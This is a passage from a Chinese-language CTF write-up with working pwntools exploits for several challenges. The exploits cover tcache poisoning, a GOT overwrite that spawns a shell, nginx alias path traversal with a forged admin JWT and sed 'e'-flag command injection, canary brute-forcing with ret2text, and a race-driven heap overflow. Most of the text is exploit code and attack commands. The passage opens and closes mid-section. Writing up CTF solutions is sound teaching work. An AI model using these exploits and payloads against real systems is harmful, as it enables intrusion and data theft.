- `free(slot1)`

这样 tcache[0x60] 中形成两节点链表。

接下来利用 `option7(slot1, qidx=0)` 修改头节点的 `fd`，把它伪造成：

```
target_strict = scheduler.ctrl - 0x10
fd_strict = target_strict ^ (slot1_addr >> 12)
```

减去 `0x10` 的原因是：tcache 链里处理的是 chunk 位置，而不是最终用户视角下的结构体字段位置。通过这种方式，后续第二次 `malloc(0x50)` 返回的位置会命中我们想要的控制区。

然后连续两次 `option5`：

- 第一次：正常从 tcache 弹出真实 chunk
- 第二次：命中伪造地址

第二次伪造分配时，`option5` 会自动写入多个初始化字段，从而把 `strict_policy` 覆盖为 `0`。



关闭 strict 后，下一步就是把 task0 的 handler 劫持到 `diag.audit_sink`。

方法和上一步完全一样：再做一次 tcache poisoning。

重新申请两个 session：

- `slot4`
- `slot5`

然后依次回收：

- `free(slot4)`
- `free(slot5)`

再次构造投毒：

```
target_desc = task0_desc
fd_desc = target_desc ^ (slot5_addr >> 12)
```

之后连续两次 `option5`：

- 第一次：弹出真实 chunk
- 第二次：命中伪造的 `task0_desc`



最后直接执行：

```
option9 -> dispatch task_id = 0
```

此时满足两个条件：

- `strict_policy == 0`
- `task0->handler == diag.audit_sink`

所以 `dispatch` 不再限制 handler，程序会直接跳转到 `audit_sink`，进入审计路径并输出 flag。

### exp.py

```
from pwn import *
import re

context.log_level = 'debug'

HOST = 'nc1.ctfplus.cn'
PORT = 36641

BIN = 'inference_forge'
LD = 'ld-linux-x86-64.so.2'
LIBPATH = '/home/yu/桌面/heap/deps/gcc14/usr/lib/x86_64-linux-gnu:/home/yu/桌面/heap'

PROMPT = b'gateway> '

def start(local=True):
    if local:
        return process([LD, '--library-path', LIBPATH, BIN])
    return remote(HOST, PORT)

def recv_menu(io):
    return io.recvuntil(PROMPT)

def choose(io, n):
    io.sendline(str(n).encode())

def opt3_bootstrap(io):
    choose(io, 3)
    return recv_menu(io)

def opt4_inspect(io):
    choose(io, 4)
    out = recv_menu(io)
    txt = out.decode('latin-1', errors='ignore')

    m = re.search(r'queue_ctrl=(0x[0-9a-fA-F]+) strict_policy=(\d+) healthy=(\d+)', txt)
    queue_ctrl = int(m.group(1), 16) if m else None
    strict = int(m.group(2)) if m else None

    descs = []
    for mm in re.finditer(r"\[task:(\d+)\] desc=(0x[0-9a-fA-F]+) handler=(0x[0-9a-fA-F]+) ctx=(0x[0-9a-fA-F]+)", txt):
        descs.append((
            int(mm.group(1)),
            int(mm.group(2), 16),
            int(mm.group(3), 16),
            int(mm.group(4), 16)
        ))
    return out, queue_ctrl, strict, descs

def opt10_tele(io):
    choose(io, 10)
    out = recv_menu(io)
    txt = out.decode('latin-1', errors='ignore')

    m_sc = re.search(r'scheduler\.ctrl=(0x[0-9a-fA-F]+) strict_policy=(\d+)', txt)
    sched = int(m_sc.group(1), 16) if m_sc else None
    strict = int(m_sc.group(2)) if m_sc else None

    m_audit = re.search(r'diag\.postproc_default=(0x[0-9a-fA-F]+) diag\.audit_sink=(0x[0-9a-fA-F]+)', txt)
    postproc = int(m_audit.group(1), 16) if m_audit else None
    audit = int(m_audit.group(2), 16) if m_audit else None

    sessions = {}
    for mm in re.finditer(r'\[session:(\d+)\] handle=(0x[0-9a-fA-F]+)', txt):
        sessions[int(mm.group(1))] = int(mm.group(2), 16)

    return out, sched, strict, postproc, audit, sessions

def opt5_alloc(io, slot, tensor_bytes, alias=b'A'):
    choose(io, 5)
    io.sendlineafter(b'session.slot(0-15)> ', str(slot).encode())
    io.sendlineafter(b'session.tensor_bytes> ', str(tensor_bytes).encode())
    io.sendlineafter(b'session.alias> ', alias if isinstance(alias, bytes) else str(alias).encode())

    out = recv_menu(io)
    txt = out.decode('latin-1', errors='ignore')
    m = re.search(
        r'session tensor ready slot=(\d+) handle=(0x[0-9a-fA-F]+) payload=(0x[0-9a-fA-F]+) postproc=(0x[0-9a-fA-F]+)',
        txt
    )
    if not m:
        return out, None, None, None
    return out, int(m.group(2), 16), int(m.group(3), 16), int(m.group(4), 16)

def opt6_recycle(io, slot):
    choose(io, 6)
    io.sendlineafter(b'session.slot> ', str(slot).encode())
    return recv_menu(io)

def opt7_patch(io, slot, qidx, qval):
    choose(io, 7)
    io.sendlineafter(b'diag.session.slot> ', str(slot).encode())
    io.sendlineafter(b'diag.qword_index> ', str(qidx).encode())
    io.sendlineafter(b'diag.qword_value(u64)> ', str(qval).encode())
    return recv_menu(io)

def opt9_dispatch(io, taskid):
    choose(io, 9)
    io.sendlineafter(b'queue.task_id> ', str(taskid).encode())
    return recv_menu(io)

def main(local=True):
    io = start(local=local)
    recv_menu(io)

    log.info('bootstrap scheduler')
    opt3_bootstrap(io)

    out4, queue_ctrl, strict, descs = opt4_inspect(io)
    log.info(f'queue_ctrl={hex(queue_ctrl)} strict={strict}')
    assert descs and descs[0][0] == 0
    task0_desc = descs[0][1]

    out10, sched, strict2, postproc, audit, sess = opt10_tele(io)
    log.info(f'scheduler.ctrl={hex(sched)} strict={strict2} audit={hex(audit)} postproc={hex(postproc)}')

    # stage 1
    log.info('Stage1: poison tcache, target scheduler_ctrl-0x10')

    _, h0, _, _ = opt5_alloc(io, 0, 0x20, b'A')
    _, h1, _, _ = opt5_alloc(io, 1, 0x20, b'B')
    opt6_recycle(io, 0)
    opt6_recycle(io, 1)

    target_strict = sched - 0x10
    fd_strict = target_strict ^ (h1 >> 12)
    log.info(f'target_strict={hex(target_strict)} fd={hex(fd_strict)}')
    opt7_patch(io, 1, 0, fd_strict)

    _, h2, _, _ = opt5_alloc(io, 2, 0x20, b'C')
    log.info(f'slot2(real pop) handle={hex(h2)}')
    _, h3, _, _ = opt5_alloc(io, 3, 0x20, b'D')
    log.info(f'slot3(fake pop) handle={hex(h3)} (expect {hex(target_strict)})')

    out4a, queue_ctrl_a, strict_a, descs_a = opt4_inspect(io)
    log.info(f'after stage1 strict={strict_a} queue_ctrl={hex(queue_ctrl_a)}')

    # stage 2
    log.info('Stage2: poison tcache, target task0 desc and patch handler')

    _, h4, _, _ = opt5_alloc(io, 4, 0x20, b'E')
    _, h5, _, _ = opt5_alloc(io, 5, 0x20, b'F')
    opt6_recycle(io, 4)
    opt6_recycle(io, 5)

    target_desc = task0_desc
    fd_desc = target_desc ^ (h5 >> 12)
    log.info(f'target_desc={hex(target_desc)} fd={hex(fd_desc)}')
    opt7_patch(io, 5, 0, fd_desc)

    _, h6, _, _ = opt5_alloc(io, 6, 0x20, b'G')
    log.info(f'slot6(real pop) handle={hex(h6)}')

    alias_patch = b'A' * 8 + p64(audit)[:6]
    _, h7, _, _ = opt5_alloc(io, 7, 0x20, alias_patch)
    log.info(f'slot7(fake pop) handle={hex(h7)} (expect {hex(target_desc)})')

    out4b, queue_ctrl_b, strict_b, descs_b = opt4_inspect(io)
    log.info(f'after stage2 strict={strict_b} queue_ctrl={hex(queue_ctrl_b)}')
    for t, d, h, c in descs_b:
        if t == 0:
            log.info(f'final task0 handler={hex(h)} ctx={hex(c)}')

    # satge 3
    out = opt9_dispatch(io, 0)
    print(out.decode('latin-1', errors='ignore'))

    try:
        rest = io.recv(timeout=1)
        if rest:
            print(rest.decode('latin-1', errors='ignore'))
    except EOFError:
        pass

    io.interactive()

if __name__ == '__main__':
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument('--remote', action='store_true')
    args = ap.parse_args()
    main(local=not args.remote)
```



---



## 3.treasure

程序保护如下：

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```



程序主逻辑并不复杂，`main` 位于 PIE 基址偏移 `0x12b3` 附近，流程大致如下：

1. 输出欢迎信息；
2. 读取一个 `password`，格式为 `%llu`；
3. 如果：

```
password == pie + 0x1209
```

则直接执行：

```
system("/bin/sh")
```

否则进入后门逻辑，给用户两次“修复”的机会。



后门流程的关键变量如下：

- 全局下标变量：`qword_48a0`
- 写入基址：`0x40a0`
- 每次写入方式：

```
read(0, base + idx * 8, 8)
```

- 下标检查只有上界：

```
if (idx > 0xff) reject;
```

但是没有下界检查，也就是说可以传入负数下标。

每次写入结束后，程序还会执行：

```
printf("after your operation, the context: %s", base + idx * 8);
```

因为没有检查 `idx < 0`，所以可以构造：

```
base + idx * 8
```

写到程序低地址的区域，比如 `.got`、`.fini_array` 等位置。

写入之后立刻用 `%s` 从该地址打印内容，直到遇到 `\x00` 为止。



泄漏点是 `.fini_array`。

已知：

- `.fini_array = 0x3df0`
- 写入基址 `base = 0x40a0`

对应的下标为：

```
idx = (0x3df0 - 0x40a0) / 8 = -86
```

也就是：

```
IDX_LEAK_PIE = -86
```

当我们把目标地址选到 `.fini_array` 时，通常会看到一个现象：

- 前面的 `read(0, target, 8)` 对该区域写入可能并不成功
- 但后续的 `%s` 仍然会从该地址开始打印原始内容

而 `.fini_array[0]` 中原本存放的是一个代码指针，其值通常为：

```
pie + 0x11c0
```

因此只要读出这个值，就能反推出 PIE：

```
pie = leak_ptr - 0x11c0
```



另一个关键点是 `printf@got`。

已知：

- `printf@got = 0x4038`

对应下标为：

```
idx = (0x4038 - 0x40a0) / 8 = -13
```

也就是：

```
IDX_PRINTF_GOT = -13
```

由于我们可以对这个位置做 8 字节写，因此可以直接改写 `printf@got`，控制程序后续每一次 `printf` 的真实跳转目标。



利用链：

用到的几个关键偏移如下：

```
OFF_LEAK_PTR = 0x11C0     # .fini_array[0] 指向这里
OFF_STAGE1   = 0x1458     # 第二轮 read 逻辑起点
OFF_STAGE2   = 0x139D     # lea "/bin/sh"; call system
```

其中：

- `0x1458` 是一段很关键的代码，它属于第二轮写逻辑的一部分；
- 如果能劫持到这里，程序会再次执行：

```
read(0, base + idx * 8, 8)
```



总的攻击payload构造：

先输入错误的 password，进入后门逻辑。

然后第一次写选择：

```
idx = -86
```

即指向 `.fini_array`。

此时虽然写入未必成功，但后面的 `%s` 会把该处原始内容打印出来。取出前 6 个字节后补零，即可还原指针：

```
pie = u64(leak[:6].ljust(8, b"\x00")) - 0x11c0
```

这样就可以得到程序的动态地址。



接着进入第二轮写。

选择：

```
idx = -13
```

也就是 `printf@got` 的位置。

把它改写为：

```
printf@got = pie + 0x1458
```

`0x1458` 这段代码恰好会再次做一次：

```
read(0, base + idx * 8, 8)
```



由于当前 `idx` 还是 `-13`，这个额外的 `read` 仍然会写到 `printf@got` 上。

于是我们把它进一步改成(再次截取)：

```
printf@got = pie + 0x139d
```

这里 `0x139d` 对应的是程序里已经现成存在的一段逻辑，大致效果是：

```
 return system("/bin/sh")
```

### payload

```
import argparse
import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"


OFF_LEAK_PTR = 0x11C0     
OFF_STAGE1 = 0x1458       
OFF_STAGE2 = 0x139D       

IDX_LEAK_PIE = -86       
IDX_PRINTF_GOT = -13     

FLAG_RE = re.compile(rb"polarisctf\{[^}\n]+\}")


def pwn_once(host: str, port: int, cmd: bytes) -> bytes:
    io = remote(host, port, timeout=4)

    io.recvuntil(b"password: ")
    io.sendline(b"0")

    io.recvuntil(b"Which one?\n")
    io.sendline(str(IDX_LEAK_PIE).encode())
    io.send(b"B" * 8)

    io.recvuntil(b"after your operation, the context: ")
    leak = io.recvuntil(b"you should tell me your name.", drop=True)
    if len(leak) < 6:
        raise EOFError(f"short leak: {leak!r}")

    pie = u64(leak[:6].ljust(8, b"\x00")) - OFF_LEAK_PTR
    log.success(f"PIE = {hex(pie)}")

    io.sendline(b"a")
    io.recvuntil(b"Last time!Lucky, guy!\n")

    io.sendline(str(IDX_PRINTF_GOT).encode())
    io.send(p64(pie + OFF_STAGE1))

    io.send(p64(pie + OFF_STAGE2))
    io.sendline(cmd)

    out = io.recvrepeat(2.0)
    io.close()
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="nc1.ctfplus.cn")
    ap.add_argument("--port", type=int, default=40889)
    ap.add_argument("--tries", type=int, default=8)
    ap.add_argument(
        "--cmd",
        default="cat flag; cat /flag; ls -al",
        help="command sent to spawned /bin/sh",
    )
    args = ap.parse_args()

    for i in range(1, args.tries + 1):
        try:
            log.info(f"try {i}/{args.tries}")
            out = pwn_once(args.host, args.port, args.cmd.encode())
            print(out.decode("latin-1", errors="ignore"))
            m = FLAG_RE.search(out)
            if m:
                log.success(f"FLAG: {m.group().decode()}")
                return
        except Exception as e:
            log.warning(f"failed: {e}")

    log.failure("no flag found in retries")


if __name__ == "__main__":
    main()
```



---



## 4.ct

题目给了两个文件

- `nginx` 二进制
- `default.conf`

`default.conf` 中最关键的配置片段如下：

```
location /static {
    alias /var/www/static/;
}

location /api/config/ {
    proxy_pass http://127.0.0.1:3002;
}

location /admin/config/ {
    proxy_pass http://127.0.0.1:3002/api/config/;
}
```

同时配置注释里还明确提到：

- `config-service` 使用 JWT
- JWT 配置在 `/var/www/app/config.yaml`

初步思路：

1. 先找文件读取 / 信息泄露，拿到 JWT secret；
2. 再伪造管理员 JWT，访问配置服务；
3. 最后从配置更新逻辑中继续寻找更深一层漏洞，拿到 RCE 或直接读 flag。
4. 

Nginx alias 路径穿越漏洞

这里的：

```
location /static {
    alias /var/www/static/;
}
```

如果 `location` 没有写成 `/static/`，再配合 `alias`，就很容易出现路径拼接和规范化不一致的问题，进而导致路径穿越。这里可以直接尝试：

```
curl -s 'http://TARGET/static../app/config.yaml'
```

成功返回：

```
jwt_secret: "iot-guardian-s3cret-key-2024"
```

因为题目注释已经说明 JWT 的配置就在这个文件里。也就是说，通过 Nginx 的 alias 路径穿越，我们已经拿到了后端鉴权所依赖的签名密钥。



伪造管理员 JWT 漏洞：

后端对 JWT 的校验较弱，只要 payload 中包含：

```
{"role":"admin"}
```

即可通过权限检查。

因此可以直接使用 HS256 伪造 token：

- `secret = iot-guardian-s3cret-key-2024`
- `payload = {"role":"admin"}`

生成出的 token 形如：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.m6FN2KFhOnDuHGtiwO1rs13jgJPkXR9lwzLXn1Lfcf0
```

然后带着这个 token 去请求配置接口：

```
curl -s -H 'Authorization: Bearer <TOKEN>' \
  'http://TARGET/api/config/list'
```

如果能正常返回配置列表，就说明管理员权限已经到手。

`/api/config/update` 命令执行漏洞：

这个接口接收三个参数：

- `device_id`
- `old_value`
- `new_value`

测试后可以发现：

- ```
  old_value
  ```

   只允许字母数字，否则会报：

  - `invalid old_value: must be alphanumeric`

- `new_value` 虽然做了一些黑名单过滤，但没有过滤 `#`

通过下载服务二进制：

```
/static../app/config-service
```

在 `main.handleConfigUpdate` 附近可以还原出关键逻辑：

先构造一个 sed 表达式：

```
fmt.Sprintf("s#.*%s.*#%s#", old_value, new_value)
```

然后执行：

```
exec.Command("sed", "-i", sedExpr, file).CombinedOutput()
```

这说明这里并不是简单的 shell 命令拼接，所以常见的：

- `;`
- `&&`
- `$()`
- ``cmd``

这些 shell 注入写法并不能直接生效，因为程序没有经过 shell，而是直接调用了 `exec.Command("sed", ...)`。

GNU sed 的替换命令支持 `e` 标志：

```
s/regexp/replacement/e
```

含义是：把 replacement 的结果当作 shell 命令执行。

这里程序使用 `#` 作为分隔符，因此我们可以构造：

```
new_value = id#e
```

最终拼出来的表达式就是：

```
s#.*admin.*#id#e#
```

这样一来，原本应该只是文本替换的 sed 命令，就会在执行替换时把 `id` 当作命令执行。

回显中可以看到：

```
uid=0(root) gid=0(root) groups=0(root)
```

说明命令执行已经成立，而且服务权限还是 `root`。

到这里只要改一下命令，就可以拿到flag。

```
curl -s -X POST \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{"device_id":"cam-01","old_value":"admin","new_value":"cat /flag#e"}' \
  'http://TARGET/api/config/update'
```



---



## 5.httpd

程序保护如下：

```
Canary: Yes
NX: Yes
PIE: No
RELRO: Partial
```

这题的关键点很明确：

- **没有 PIE**，代码段地址固定，适合直接 ret2text；
- **有 Canary**，所以不能直接无脑覆盖返回地址；



整条利用链可以分成 4 步：

1. 先通过逻辑缺陷拿到认证 token；
2. 利用 `/config` 的栈溢出构造一个“成功 / 崩溃”的 oracle；
3. 按字节盲打出 canary 和调用者 `rbp`；
4. 最后覆写返回地址，跳进程序内部现成的 `send_file` 逻辑，直接读取 `flag`。

认证绕过 + 栈溢出 + fork oracle 盲打 + ret2text 伪造栈帧



漏洞发现：

程序存在一个公开接口：

```
GET /getCookie
```

这个接口会直接下发：

```
Set-Cookie: token=...
```

后续只要带着这个 cookie 去访问 `/config`，就能通过认证检查。因此我们不需要研究登录流程，直接先请求一次 `/getCookie` 拿 token 即可。

在处理 `/config` 的 POST 请求时。

程序会解析 body 中的 `route_name` 字段，并把它的 value 用 `memcpy` 拷贝到栈上的一个局部缓冲区中。问题在于：

- 拷贝长度完全来自用户可控的 `value_len`
- 没有做边界检查

因此这里是一个栈溢出。

溢出后可以一路覆盖到：

- canary
- saved rbx
- saved rbp
- return address

偏移如下：

- `+0x88`：canary
- `+0x90`：padding
- `+0x98`：saved rbx
- `+0xA0`：saved rbp
- `+0xA8`：return address



`/config` 的 body 并不是原样拿来用，而是会先按表单格式解析：

1. 先按 `&` 切分键值对；
2. 再按 `=` 切分 key / value；
3. 然后对 value 做 URL decode：
   - `%xx` → 原始字节
   - `+` → 空格
4. 最终以**解码后的长度**作为 `memcpy` 的长度

这意味着如果直接发送原始二进制 payload，就可能被：

- `&`
- `=`
- `\r\n`

之类的特殊字符截断。

> 把 `route_name` 的 payload 全部编码成 `%XX`

服务端解码后，就能恢复任意字节，包括 `\x00`，从而让我们精确覆盖 canary、rbp、返回地址等内容。

这题服务端是 fork 模型：

- 父进程一直在监听
- 每个请求由子进程处理

因此当我们猜错 canary 或栈内容时，只会把当前子进程打崩，父进程仍然继续提供服务，就可以一直爆破。

我们把 `/config` 作为 oracle 使用：

- 如果 guess 错误，触发 `__stack_chk_fail` 或直接崩溃，返回异常，一般表现为 HTTP 500 或连接异常；
- 如果 guess 正确，函数能正常返回，响应里会包含：

```
{"setInfo" : 1}
```

因此我们可以通过“有没有正常 200 响应、body 里有没有 `setInfo`”来判断当前字节是否猜对。

拿到 canary 之后，就可以继续往后覆盖到 saved `rbp`。

同样按字节爆破 8 字节：

- 前面放对的 canary
- 填满中间 padding
- 然后逐字节猜 `rbp`

最终拿到调用者栈帧的 `rbp` 值。

这一步很重要，因为最后的 ret2text 不是简单跳转，而是要伪造栈帧里的局部变量。没有 `caller_rbp` 就没法精确定位这些位置。

我们把调用者栈帧中的关键字段伪造为：

- `[caller_rbp-0x30] = caller_rbp-0x110`
- `[caller_rbp-0x28] = 200`
- `[caller_rbp-0x24] = 4`

其中：

- `caller_rbp-0x110` 位置放字符串 `"flag\x00"`
- `200` 作为 HTTP status
- `4` 作为 client fd

这样当程序执行到 `0x402bf1` 时，就会把它当成一次正常的 `send_file("flag", 200, 4)` 流程，最终把 `flag` 文件内容直接回显到 socket。

相对 `route_name` 目标缓冲区起始，核心布局如下：

- `0x88`：canary
- `0x90`：padding
- `0x98`：saved rbx
- `0xA0`：saved rbp = `caller_rbp`
- `0xA8`：return address = `0x402bf1`
- `0x100`：字符串 `flag\x00`
- `0x1e0`：伪造 `[rbp-0x30]`，即 filename 指针
- `0x1e8`：伪造 `[rbp-0x28]`，即 status
- `0x1ec`：伪造 `[rbp-0x24]`，即 fd

### exp.py

```
#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import time


RET_SEND_FILE_MID = 0x402BF1
OFF_CANARY = 0x88
OFF_SAVED_RBP = 0xA0
OFF_RET = 0xA8
OFF_FLAG_STR = 0x100
OFF_FAKE_FILENAME_PTR = 0x1E0
OFF_FAKE_STATUS = 0x1E8
OFF_FAKE_FD = 0x1EC


def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def urlencode_all(data: bytes) -> bytes:
    return b"".join(f"%{b:02x}".encode() for b in data)


class Exploit:
    def __init__(self, host: str, port: int, timeout: float = 3.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.cookie = None

    def _request(self, req: bytes) -> bytes:
        try:
            with socket.create_connection((self.host, self.port), timeout=self.timeout) as s:
                s.settimeout(self.timeout)
                s.sendall(req)
                chunks = []
                while True:
                    try:
                        data = s.recv(4096)
                    except socket.timeout:
                        break
                    if not data:
                        break
                    chunks.append(data)
                return b"".join(chunks)
        except OSError:
            return b""

    @staticmethod
    def _status_code(resp: bytes):
        m = re.match(br"HTTP/\d\.\d (\d{3})", resp)
        if not m:
            return None
        return int(m.group(1))

    @staticmethod
    def _auth_fail(resp: bytes) -> bool:
        return (
            b'"authLogin" : 0' in resp
            or b'"authLogin":0' in resp
            or b'"authLogin": 0' in resp
        )

    @staticmethod
    def _setinfo_ok(resp: bytes) -> bool:
        return (
            b'"setInfo" : 1' in resp
            or b'"setInfo":1' in resp
            or b'"setInfo": 1' in resp
        )

    def get_cookie(self, retry: int = 20) -> str:
        req = (
            f"GET /getCookie HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        for _ in range(retry):
            resp = self._request(req)
            m = re.search(br"(?i)^Set-Cookie:\s*token=([^;\r\n]+)", resp, re.M)
            if m:
                self.cookie = m.group(1).decode(errors="ignore")
                return self.cookie
            time.sleep(0.05)
        raise RuntimeError("get cookie failed")

    def post_config(self, route_name_raw: bytes) -> bytes:
        if not self.cookie:
            self.get_cookie()
        body = (
            b"route_name="
            + urlencode_all(route_name_raw)
            + b"&ip=1.1.1.1&subnet_mask=255.255.255.0&gateway=1.1.1.254"
        )
        req = (
            f"POST /config HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Cookie: token={self.cookie}\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode() + body
        return self._request(req)

    def oracle(self, overflow: bytes) -> bool:
        for _ in range(5):
            resp = self.post_config(overflow)
            if not resp:
                return False
            if self._auth_fail(resp):
                self.get_cookie()
                continue
            status = self._status_code(resp)
            return status == 200 and self._setinfo_ok(resp)
        return False

    def brute_canary(self) -> bytes:
        canary = b"\x00"
        print("[*] Bruting canary...")
        for i in range(1, 8):
            found = False
            for g in range(256):
                payload = b"A" * OFF_CANARY + canary + bytes([g])
                if self.oracle(payload):
                    canary += bytes([g])
                    print(f"[+] canary byte {i}: 0x{g:02x}")
                    found = True
                    break
            if not found:
                raise RuntimeError(f"canary byte {i} not found")
        print(f"[+] canary = {canary.hex()}")
        return canary

    def brute_caller_rbp(self, canary: bytes) -> int:
        rbp_bytes = b""
        print("[*] Bruting caller rbp...")
        for i in range(8):
            found = False
            for g in range(256):
                payload = (
                    b"A" * OFF_CANARY
                    + canary
                    + b"B" * (OFF_SAVED_RBP - OFF_CANARY - 8)
                    + rbp_bytes
                    + bytes([g])
                )
                if self.oracle(payload):
                    rbp_bytes += bytes([g])
                    print(f"[+] rbp byte {i}: 0x{g:02x}")
                    found = True
                    break
            if not found:
                raise RuntimeError(f"rbp byte {i} not found")
        caller_rbp = struct.unpack("<Q", rbp_bytes)[0]
        print(f"[+] caller_rbp = 0x{caller_rbp:016x}")
        return caller_rbp

    def build_final(self, canary: bytes, caller_rbp: int) -> bytes:
        total = 0x1F0
        payload = bytearray(b"A" * total)

        payload[OFF_CANARY : OFF_CANARY + 8] = canary
        payload[OFF_SAVED_RBP : OFF_SAVED_RBP + 8] = p64(caller_rbp)
        payload[OFF_RET : OFF_RET + 8] = p64(RET_SEND_FILE_MID)

        payload[OFF_FLAG_STR : OFF_FLAG_STR + 5] = b"flag\x00"

        filename_ptr = caller_rbp - 0x110
        payload[OFF_FAKE_FILENAME_PTR : OFF_FAKE_FILENAME_PTR + 8] = p64(filename_ptr)
        payload[OFF_FAKE_STATUS : OFF_FAKE_STATUS + 4] = p32(200)
        payload[OFF_FAKE_FD : OFF_FAKE_FD + 4] = p32(4)
        return bytes(payload)

    def pwn(self) -> bytes:
        self.get_cookie()
        canary = self.brute_canary()
        caller_rbp = self.brute_caller_rbp(canary)
        final_payload = self.build_final(canary, caller_rbp)
        print("[*] Sending final payload...")
        resp = self.post_config(final_payload)
        if not resp:
            raise RuntimeError("no response for final payload")
        return resp


def main():
    parser = argparse.ArgumentParser(description="httpd pwn exploit")
    parser.add_argument("--host", default="nc1.ctfplus.cn")
    parser.add_argument("--port", type=int, default=35279)
    parser.add_argument("--timeout", type=float, default=3.0)
    args = parser.parse_args()

    exp = Exploit(args.host, args.port, timeout=args.timeout)
    resp = exp.pwn()

    m = re.search(br"polarisctf\{[^}\r\n]+\}", resp)
    if m:
        print(f"[+] flag: {m.group(0).decode(errors='ignore')}")
    else:
        print("[!] exploit finished, but flag regex not found")
        print(resp.decode(errors="ignore"))


if __name__ == "__main__":
    main()
```



----



## 6.Throne Hazard

程序保护如下：

- `Full RELRO`
- `Canary`
- `NX`
- `No PIE`
- `SHSTK + IBT`

程序逻辑分析

程序主菜单里和利用相关的功能主要有 4 个：

1. **Calibrate self-optimizer target**
    设置全局的 `appeal target`，范围为 `0x20 ~ 0x78`
2. **Forge memory capsule**
    分配 capsule，并进行一次输入
3. **Build actuator**
    分配 actuator 结构体
4. **Dispatch actuator**
    根据 actuator 中的 `lane / len / ptr`，从函数表中取函数并调用

其中 dispatch 用到的函数表位于：

```
.data: 0x4040e0
```

默认有 4 个槽位，对应 `lane 0 ~ 3`

漏洞在 Option 2: Forge memory capsule

程序读入长度来自全局变量 `supremacy floor`（地址 `0x4040a4`）：

- 默认 `floor = 0x20`
- 实际读入长度 = `0x20 + 0xf = 0x2f`

而 capsule 实际分配大小是 `0x30`，因此正常情况下不会出问题。

使用竞态命中后：

后台线程会异步把 `floor` 改成我们之前设置的 `target`。
 如果我们先把 `target` 设置成 `0x78`，那么竞态命中时：

- `floor = 0x78`
- 实际读入长度 = `0x78 + 0xf = 0x87`

但 capsule 依旧只有 `0x30`，因此会发生向后堆溢出。

堆布局：先分配 capsule，再分配 actuator，二者相邻。
于是当 Option 2 读入 `0x87` 字节时，正好可以从 capsule 溢出到后面的 actuator 用户区。

可控覆盖到的关键字段为：

- `lane`：`+0x10`
- `len`：`+0x18`
- `ptr`：`+0x20`

整体利用链：

1. 先泄漏 libc 地
2. 再改函数表，构造 ORW 读 flag



泄漏 libc：

`Dispatch actuator` 会根据 `lane` 到函数表中取函数，然后用 actuator 的 `len / ptr` 作为参数调用。

我们先把 actuator 覆写成：

- `lane = 0`
- `len = 8`
- `ptr = read@got`

此时触发 `dispatch lane 0`，实际上会调用默认的 `write` 逻辑，把 `read@got` 中保存的真实地址输出出来。

于是得到：

```
read_libc = *(read@got)
libc_base = read_libc - offset(read)
```

这样 libc 基址就出来了。



任意读取：

默认 `lane = 1` 对应的是 `readn` 一类的读入函数。
 如果我们把 actuator 改成：

- `lane = 1`
- `len = 可控长度`
- `ptr = 任意地址`

那么触发 dispatch 后，就会往 `ptr` 指向的位置读入 `len` 字节数据。
这实际上就是一个 任意地址写。

有了这个能力后，就可以改 `.data` 里的 dispatch 函数表。

利用任意地址写，将 dispatch 表改为：

- `table[2] = open`
- `table[3] = readv`

之后再把：

- `/flag\x00` 写到可写内存
- `iovec` 结构写到可写内存
- 最后再把 `table[1]` 改成 `writev`

这样整个 ORW 链就完成了。

### exp.py

```
from pwn import *
import argparse
import re
import time

context.log_level = "error"

BIN = "./pwn"
LIBC = "./libc.so.6"
LD = "./ld-linux-x86-64.so.2"
HOST = "nc1.ctfplus.cn"
PORT = 39678

# Writable globals in .bss/.data
PATH_ADDR = 0x404160
OUT_IOV_ADDR = 0x404240
IOV_ADDR = 0x404260
BUF_ADDR = 0x404300
TABLE_ADDR = 0x4040E0

FLAG_RE = re.compile(rb"(?:[A-Za-z0-9_\-]+\{[^\n\r\}]{1,200}\})")

elf = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False)


def start(local: bool):
    if local:
        io = process([LD, "--library-path", ".", BIN])
    else:
        io = remote(HOST, PORT)
    io.timeout = 15
    return io


def menu(io, choice: int):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def parse_left(blob: bytes) -> int:
    m = re.search(rb"0x[0-9a-f]+", blob)
    if not m:
        raise ValueError("failed to parse forge length")
    return int(m.group(), 16)


def race_overflow(io, lane: int, length: int, ptr: int, max_try: int = 160):
    payload = bytearray(b"C" * 0x87)
    payload[0x4F:0x53] = p32(lane)
    payload[0x57:0x5F] = p64(length)
    payload[0x5F:0x67] = p64(ptr)

    for i in range(max_try):
        menu(io, 2)
        io.recvuntil(b"byte)> ")

        # Align with overmind thread window.
        time.sleep(0.12 + (i % 16) * 0.01)
        io.send(b"X")

        out = io.recvuntil(b"bytes left)> ")
        n = parse_left(out)
        io.send(bytes(payload[:n]))
        io.recvuntil(b"committed")

        if n == 0x87:
            return

    raise RuntimeError("race overflow failed in max_try")


def dispatch_read(io, n: int) -> bytes:
    menu(io, 6)
    io.recvuntil(b"\n")
    data = io.recvn(n)
    io.recvuntil(b"[dispatch complete]")
    return data


def dispatch_write(io, data: bytes):
    menu(io, 6)
    io.recvuntil(b"\n")
    io.send(data)
    io.recvuntil(b"[dispatch complete]")


def exploit_once(io, path_bytes: bytes, chunk_size: int = 0x80) -> bytes:
    menu(io, 1)
    io.recvuntil(b"> ")
    io.sendline(b"120")  # 0x78
    io.recvuntil(b"supremacy.")

    menu(io, 2)
    io.recvuntil(b"byte)> ")
    io.send(b"A")
    out = io.recvuntil(b"bytes left)> ")
    n = parse_left(out)
    io.send(b"B" * n)
    io.recvuntil(b"committed")

    menu(io, 3)
